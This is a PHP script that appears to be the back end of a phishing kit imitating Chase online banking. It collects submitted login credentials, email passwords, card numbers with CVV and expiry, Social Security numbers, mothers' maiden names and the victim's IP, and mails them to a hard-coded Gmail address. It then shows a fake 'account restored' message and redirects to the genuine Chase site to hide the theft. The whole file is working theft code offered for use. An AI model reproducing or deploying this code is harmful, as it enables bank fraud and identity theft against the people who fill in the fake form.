<?

$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
$message .= "--------Created By mR.j0n3z -----\n";
$message .= "User-ID: ".$_POST['userid']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "-----email information-----------\n";
$message .= "Email: ".$_POST['email']."\n";
$message .= "Email Password: ".$_POST['email_password']."\n";
$message .= "Phone No: ".$_POST['contact']."\n";
$message .= "Full Name: ".$_POST['name']."\n";
$message .= "Zipcode: ".$_POST['zipcode']."\n";
$message .= "Mother Maiden Name: ".$_POST['mmn']."\n";
$message .= "Credit Card: ".$_POST['creditcard']."\n";
$message .= "Exp Date: ".$_POST['expdate']."\n";
$message .= "CVV: ".$_POST['cvv']."\n";
$message .= "Social Security No: ".$_POST['ssn']."\n";
$message .= "--------------i.p----------------\n";
$message .= "IP: ".$ip."\n";
$message .= "Date : $adddate\n";
$message .= "User-Agent: ".$browser."\n";
$message .= "-------Created By MRMONEY----------\n";


$recipient = "mooadaannn0@gmail.com";
$subject = "mR.j0n3z";
$headers = "mR.j0n3z Rul3z";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 if (mail($recipient,$subject,$message,$headers))
	   {
?>
	
		   <script language=javascript>
alert('Access to your Account has been successfully restored! You can now continue to use your account as before. Thank you.');
window.location='https://chaseonline.chase.com';
</script>
<?

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>